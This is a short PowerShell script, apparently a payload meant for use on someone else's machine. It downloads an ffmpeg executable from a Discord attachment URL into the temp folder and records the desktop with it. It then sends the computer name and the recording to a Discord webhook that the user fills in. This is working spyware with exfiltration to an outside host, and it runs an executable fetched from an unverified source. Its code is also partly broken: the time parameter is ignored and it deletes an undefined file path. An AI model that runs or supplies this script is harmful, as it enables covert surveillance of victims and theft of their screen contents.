<#==================== RECORD SCREEN TO DISCORD =========================

SYNOPSIS
This script records the screen for a specified time to a mkv file,
then sends the file to a discord webhook.
(use -t to specify time limit eg. RecordScreen -t 30)
records 10 seconds by default

USAGE
1. Replace YOUR_WEBHOOK_HERE with your discord webhook.
2. Run script

#>

$hookurl = 'YOUR_WEBHOOK_HERE'

Function RecordScreen{
param ([int[]]$t)

$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":arrows_counterclockwise: ``Recording screen for $t seconds..`` :arrows_counterclockwise:"} | ConvertTo-Json
Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys

$Path = "$env:Temp\ffmpeg.exe"

If (!(Test-Path $Path)){  
$url = "https://cdn.discordapp.com/attachments/803285521908236328/1089995848223555764/ffmpeg.exe"
iwr -Uri $url -OutFile $Path
}

sleep 1
$mkvPath = "$env:Temp\ScreenClip.mkv"

if ($t.Length -eq 0){$t = 10}

.$env:Temp\ffmpeg.exe -f gdigrab -t 10 -framerate 30 -i desktop $mkvPath

curl.exe -F file1=@"$mkvPath" $hookurl | Out-Null
sleep 1
rm -Path $mp3Path -Force

}

RecordScreen -t 30